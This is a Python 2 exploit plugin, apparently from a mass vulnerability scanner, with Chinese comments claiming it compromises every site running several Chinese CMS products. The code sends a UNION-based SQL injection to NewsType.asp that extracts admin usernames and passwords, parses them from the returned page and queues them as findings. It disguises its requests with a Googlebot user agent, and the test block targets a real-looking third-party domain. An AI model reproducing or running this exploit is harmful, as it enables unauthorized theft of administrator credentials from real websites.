#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#http://hi.baidu.com/hkok8/item/7df99d25975fda4047996225
#通杀南方数据、良精系统、网软天下等
#2、通过注入秒杀管理员帐号密码，使用如下：
import urllib2
import re
import sys
import threading

from class_Queue import url_exp

class bc_nfsj_jlxt_wrtx:
    def assign(self,service, arg=None):
        if service == 'www':
            return True, arg

    def scan(self,arg):
        try:
            url0, url1 = arg

            URL=url1+"/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='"
            ss=self.open_url_data(URL)
            if ss==0:  #读取网页内容
                return 0
            p = re.compile( r'<a.+?href=\\"shownews.asp.+?>(.+?)</a></span>')
            sarr = p.findall(ss)
            if "|" in sarr[0]:
                EXP_list=[1,url0,url1,"CN_bc_nfsj_jlxt_wrtx",url1+"/NewsType.asp",sarr[0],""]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                url_exp.put(EXP_list,0.5)   #插入队列

        except Exception,e:
        #print e
            return 0

    def open_url_data(self,url):  #读取网页内容
        try:
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            #req.add_header('User-Agent','userAgentIE9')
            #req.add_header('User-Agent', "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)")
            s = urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            return s.read()
        except:
            return 0







################################################
if __name__=='__main__':
    class_www=bc_nfsj_jlxt_wrtx()
    class_www.scan(class_www.assign('www', ("http://www.baidu.com","http://zh-accp.com"))[1])





